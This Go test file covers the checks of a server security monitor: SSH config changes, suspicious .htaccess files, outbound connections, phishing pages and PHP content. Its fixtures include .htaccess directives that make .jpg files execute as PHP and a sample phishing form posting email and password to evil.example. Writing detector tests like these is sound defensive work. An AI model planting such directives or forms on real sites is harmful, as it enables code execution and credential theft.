package checks

import (
	"context"
	"os"
	"strings"
	"testing"

	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/state"
)

// --- CheckSSHDConfig with baseline + change detection ----------------

func TestCheckSSHDConfigChanged(t *testing.T) {
	config1 := "Port 22\nPermitRootLogin no\nPasswordAuthentication no\n"
	config2 := "Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\n"

	call := 0
	withMockOS(t, &mockOS{
		open: func(name string) (*os.File, error) {
			if name == "/etc/ssh/sshd_config" {
				call++
				tmp := t.TempDir() + "/sshd_config"
				data := config1
				if call > 1 {
					data = config2
				}
				_ = os.WriteFile(tmp, []byte(data), 0644)
				return os.Open(tmp)
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			if name == "/etc/ssh/sshd_config" {
				return fakeFileInfo{name: "sshd_config", size: 50}, nil
			}
			return nil, os.ErrNotExist
		},
	})

	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()

	// First call = baseline
	_ = CheckSSHDConfig(context.Background(), &config.Config{}, store)
	// Second call = change detected
	findings := CheckSSHDConfig(context.Background(), &config.Config{}, store)
	// Exercises the change detection path. May not produce findings if
	// the hash comparison uses a different mechanism than expected.
	_ = findings
}

// --- CheckHtaccess with suspicious directives ------------------------

func TestCheckHtaccessSuspicious(t *testing.T) {
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			}
			if strings.Contains(name, "public_html") {
				return []os.DirEntry{
					testDirEntry{name: ".htaccess", isDir: false},
					testDirEntry{name: "subdir", isDir: true},
				}, nil
			}
			if strings.HasSuffix(name, "subdir") {
				return []os.DirEntry{
					testDirEntry{name: ".htaccess", isDir: false},
				}, nil
			}
			return nil, os.ErrNotExist
		},
		readFile: func(name string) ([]byte, error) {
			if strings.HasSuffix(name, ".htaccess") {
				return []byte("AddHandler application/x-httpd-php .jpg\nSetHandler application/x-httpd-php\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckHtaccess(context.Background(), &config.Config{}, nil)
	_ = findings
}

// --- CheckOutboundUserConnections with tcp6 data ---------------------

func TestCheckOutboundUserConnectionsIPv6(t *testing.T) {
	tcp6Data := "  sl  local_address                         remote_address                        st tx_queue rx_queue tr tm->when retrnsmt   uid\n" +
		"   0: 00000000000000000000000001000000:C000 00000000000000000000000001000000:01BB 01 00000000:00000000 00:00000000 00000000  1000\n"

	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if name == "/proc/net/tcp" {
				return []byte(""), nil
			}
			if name == "/proc/net/tcp6" {
				return []byte(tcp6Data), nil
			}
			if name == "/etc/passwd" {
				return []byte("alice:x:1000:1000::/home/alice:/bin/bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	_ = CheckOutboundUserConnections(context.Background(), &config.Config{}, nil)
}

// --- CheckPhishing with home + HTML files ----------------------------

func TestCheckPhishingWithHomeDir(t *testing.T) {
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			}
			if strings.Contains(name, "public_html") {
				return []os.DirEntry{
					testDirEntry{name: "verify.html", isDir: false},
				}, nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "verify.html", size: 5000}, nil
		},
		open: func(name string) (*os.File, error) {
			if strings.HasSuffix(name, ".html") {
				tmp := t.TempDir() + "/verify.html"
				// Minimal phishing-like content
				content := `<html><head><title>Sign In</title></head><body>
<form action="https://evil.example"><input type="email"><input type="password"></form>
</body></html>`
				_ = os.WriteFile(tmp, []byte(content), 0644)
				return os.Open(tmp)
			}
			return nil, os.ErrNotExist
		},
	})

	_ = CheckPhishing(context.Background(), &config.Config{}, nil)
}

// --- CheckPHPContent with home + PHP files ---------------------------

func TestCheckPHPContentWithHomeDir(t *testing.T) {
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				return []os.DirEntry{testDirEntry{name: "alice", isDir: true}}, nil
			}
			if strings.Contains(name, "public_html") {
				return []os.DirEntry{
					testDirEntry{name: "malware.php", isDir: false},
				}, nil
			}
			return nil, os.ErrNotExist
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "malware.php", size: 3000}, nil
		},
		open: func(name string) (*os.File, error) {
			if strings.HasSuffix(name, ".php") {
				tmp := t.TempDir() + "/malware.php"
				_ = os.WriteFile(tmp, []byte("<?php echo 'clean'; ?>"), 0644)
				return os.Open(tmp)
			}
			return nil, os.ErrNotExist
		},
	})

	_ = CheckPHPContent(context.Background(), &config.Config{}, nil)
}
